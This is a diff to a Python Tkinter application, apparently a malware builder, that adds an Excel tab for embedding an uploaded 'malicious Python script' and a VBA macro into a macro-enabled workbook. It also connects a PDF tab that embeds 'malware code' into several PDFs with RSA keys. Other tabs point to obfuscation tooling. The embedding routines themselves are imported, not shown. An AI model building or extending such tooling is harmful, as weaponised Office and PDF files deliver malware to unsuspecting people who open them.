@@ -67,10 +67,10 @@ class CodeEmbedderApp:
 
         # Add the tabs
         self.create_code_embedder_tab()
-        self.create_excel_macro_tab()
         self.create_qmorph_tab()
-        self.create_cython_tab()
+        self.create_excel_macro_tab()
         self.create_embed_in_pdf_tab()
+        self.create_cython_tab()
         self.create_py_compile_corrupt_tab()
         self.create_dynamic_cipher_tab()
 
@@ -755,10 +755,175 @@ class CodeEmbedderApp:
             self.end_button_custom.config(bg="#4CAF50", fg="white")
 
     def create_excel_macro_tab(self):
-        """Create the Macro Excel Creator tab (Placeholder)."""
+        """Create the Macro Excel Embedder tab."""
         self.excel_macro_frame = ttk.Frame(self.notebook, padding="10")
-        self.notebook.add(self.excel_macro_frame, text="Macro Excel Creator")
-        ttk.Label(self.excel_macro_frame, text="Excel Macro Creator will go here.").grid(row=0, column=0, sticky="nsew")
+        self.notebook.add(self.excel_macro_frame, text="Macro Excel Embedder")
+
+        # Configure dynamic resizing
+        self.excel_macro_frame.columnconfigure(0, weight=1)
+        self.excel_macro_frame.rowconfigure(3, weight=1)
+
+        # Variables to store file paths
+        self.malicious_python_path_excel_macro = ""
+        self.excel_file_path_excel_macro = ""
+        self.vba_macro_path_excel_macro = ""
+
+        # Top Frame for uploading files
+        top_frame = ttk.Frame(self.excel_macro_frame)
+        top_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
+        top_frame.columnconfigure(1, weight=1)
+
+        # Malicious Python Script Upload
+        ttk.Label(top_frame, text="Malicious Python Script:").grid(row=0, column=0, sticky="w")
+        self.upload_malicious_python_btn_excel_macro = ttk.Button(
+            top_frame, text="Upload Script", command=self.load_malicious_python_excel_macro
+        )
+        self.upload_malicious_python_btn_excel_macro.grid(row=0, column=1, sticky="ew", padx=5)
+        self.show_malicious_python_btn_excel_macro = ttk.Button(
+            top_frame, text="Show", command=self.show_malicious_python_excel_macro
+        )
+        self.show_malicious_python_btn_excel_macro.grid(row=0, column=2, sticky="ew", padx=5)
+
+        info_icon_script = tk.Label(top_frame, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon_script.grid(row=0, column=3, sticky="w", padx=5)
+        ToolTip(info_icon_script, "Upload the Python script to embed as malicious code in the Excel file.")
+
+        # Excel File Upload
+        ttk.Label(top_frame, text="Excel File:").grid(row=1, column=0, sticky="w")
+        self.upload_excel_file_btn_excel_macro = ttk.Button(
+            top_frame, text="Upload Excel", command=self.load_excel_file_excel_macro
+        )
+        self.upload_excel_file_btn_excel_macro.grid(row=1, column=1, sticky="ew", padx=5)
+        self.show_excel_file_btn_excel_macro = ttk.Button(
+            top_frame, text="Show", command=self.show_excel_file_excel_macro
+        )
+        self.show_excel_file_btn_excel_macro.grid(row=1, column=2, sticky="ew", padx=5)
+
+        info_icon_excel = tk.Label(top_frame, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon_excel.grid(row=1, column=3, sticky="w", padx=5)
+        ToolTip(info_icon_excel, "Select the Excel file to embed the malicious code into.")
+
+        # VBA Macro File Upload
+        ttk.Label(top_frame, text="VBA Macro File:").grid(row=2, column=0, sticky="w")
+        self.upload_vba_macro_btn_excel_macro = ttk.Button(
+            top_frame, text="Upload Macro", command=self.load_vba_macro_excel_macro
+        )
+        self.upload_vba_macro_btn_excel_macro.grid(row=2, column=1, sticky="ew", padx=5)
+        self.show_vba_macro_btn_excel_macro = ttk.Button(
+            top_frame, text="Show", command=self.show_vba_macro_excel_macro
+        )
+        self.show_vba_macro_btn_excel_macro.grid(row=2, column=2, sticky="ew", padx=5)
+
+        info_icon_macro = tk.Label(top_frame, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon_macro.grid(row=2, column=3, sticky="w", padx=5)
+        ToolTip(info_icon_macro, "Upload the VBA macro script to embed along with the Python script in the Excel file.")
+
+        # Text box for displaying file contents
+        self.file_content_display_excel_macro = tk.Text(self.excel_macro_frame, wrap=tk.WORD, background="#f0f0f0",
+                                                        height=10)
+        self.file_content_display_excel_macro.grid(row=3, column=0, sticky="nsew", padx=10, pady=10)
+
+        # Submit Button
+        self.submit_excel_macro_btn = ttk.Button(
+            self.excel_macro_frame, text="Embed in Excel", command=self.submit_excel_macro, padding=10
+        )
+        self.submit_excel_macro_btn.grid(row=4, column=0, pady=10, sticky="ew")
+
+    def load_malicious_python_excel_macro(self):
+        """Load the malicious Python script file."""
+        self.malicious_python_path_excel_macro = filedialog.askopenfilename(
+            title="Select Python Script",
+            filetypes=[("Python files", "*.py")],
+        )
+        if self.malicious_python_path_excel_macro:
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            self.file_content_display_excel_macro.insert(
+                tk.END, f"Uploaded: {os.path.basename(self.malicious_python_path_excel_macro)}\n"
+            )
+
+    def show_malicious_python_excel_macro(self):
+        """Display the content of the uploaded Python script file."""
+        if self.malicious_python_path_excel_macro:
+            with open(self.malicious_python_path_excel_macro, 'r') as f:
+                content = f.read()
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            self.file_content_display_excel_macro.insert(tk.END, content)
+        else:
+            messagebox.showerror("Error", "No Python script uploaded.")
+
+    def load_excel_file_excel_macro(self):
+        """Load the Excel file to embed malicious code."""
+        self.excel_file_path_excel_macro = filedialog.askopenfilename(
+            title="Select Excel File",
+            filetypes=[("Excel files", "*.xls;*.xlsx")],
+        )
+        if self.excel_file_path_excel_macro:
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            self.file_content_display_excel_macro.insert(
+                tk.END, f"Uploaded: {os.path.basename(self.excel_file_path_excel_macro)}\n"
+            )
+
+    def show_excel_file_excel_macro(self):
+        """Display the content of the uploaded Excel file path."""
+        if self.excel_file_path_excel_macro:
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            self.file_content_display_excel_macro.insert(
+                tk.END, f"Excel File Path: {self.excel_file_path_excel_macro}\n"
+            )
+        else:
+            messagebox.showerror("Error", "No Excel file uploaded.")
+
+    def load_vba_macro_excel_macro(self):
+        """Load the VBA macro file."""
+        self.vba_macro_path_excel_macro = filedialog.askopenfilename(
+            title="Select VBA Macro File",
+            filetypes=[("Text files", "*.txt")],
+        )
+        if self.vba_macro_path_excel_macro:
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            self.file_content_display_excel_macro.insert(
+                tk.END, f"Uploaded: {os.path.basename(self.vba_macro_path_excel_macro)}\n"
+            )
+
+    def show_vba_macro_excel_macro(self):
+        """Display the content of the uploaded VBA macro file."""
+        if self.vba_macro_path_excel_macro:
+            with open(self.vba_macro_path_excel_macro, 'r') as f:
+                content = f.read()
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            self.file_content_display_excel_macro.insert(tk.END, content)
+        else:
+            messagebox.showerror("Error", "No VBA macro file uploaded.")
+
+    def submit_excel_macro(self):
+        """Embed Python script and VBA macro in Excel file."""
+        if not (
+                self.malicious_python_path_excel_macro and self.excel_file_path_excel_macro and self.vba_macro_path_excel_macro):
+            messagebox.showerror("Error", "Please upload all required files before submitting.")
+            return
+
+        output_excel_path = filedialog.asksaveasfilename(
+            title="Save Output Excel File",
+            defaultextension=".xlsm",
+            filetypes=[("Excel files", "*.xlsm")],
+        )
+        if output_excel_path:
+            from Excel.embed_excel import embed_python_script_and_vba
+            result = embed_python_script_and_vba(
+                self.excel_file_path_excel_macro,
+                self.malicious_python_path_excel_macro,
+                output_excel_path,
+                self.vba_macro_path_excel_macro
+            )
+            self.file_content_display_excel_macro.delete(1.0, tk.END)
+            if result:
+                self.file_content_display_excel_macro.insert(
+                    tk.END, f"Embedding successful!\nOutput saved to: {output_excel_path}"
+                )
+            else:
+                self.file_content_display_excel_macro.insert(
+                    tk.END, f"Embedding Failed!\n"
+                )
 
     def create_embed_in_pdf_tab(self):
         """Create the PDF Embedder tab with independent display for PDF embed process."""
@@ -955,11 +1120,14 @@ class CodeEmbedderApp:
             return
 
         public_key_path = os.path.join("Output", self.selected_public_key.get())
-        output_folder = Path("Output/embedded_files")
+        output_folder = Path("Output/embedded_pdf_files")
         output_folder.mkdir(parents=True, exist_ok=True)
 
         # Call your embed_in_pdf function here
-        success = True  # Replace with the actual call to `embed_in_pdf`
+        from PDF import embed_pdf_rsa as pdf
+        success = pdf.embed_python_in_multiple_pdfs(self.malware_code_path_pdf, selected_pdfs, public_key_path)
+
+        # success = True  # Replace with the actual call to `embed_in_pdf`
         if success:
             output_files = [output_folder / pdf for pdf in selected_pdfs]
             self.result_box_pdf_embed.delete(1.0, tk.END)
@@ -973,7 +1141,8 @@ class CodeEmbedderApp:
             self.result_box_pdf_embed.insert(tk.END, "An error occurred during PDF embedding.")
 
     def create_cython_tab(self):
-        """Create the Compile with Cython tab for taking a Python file input, showing code, and compiling with Cython."""
+        """Create the Compile with Cython tab for taking a Python file input, showing code, and compiling with
+        Cython."""
         self.cython_frame = ttk.Frame(self.notebook, padding="10")
         self.notebook.add(self.cython_frame, text="Compile with Cython")
 
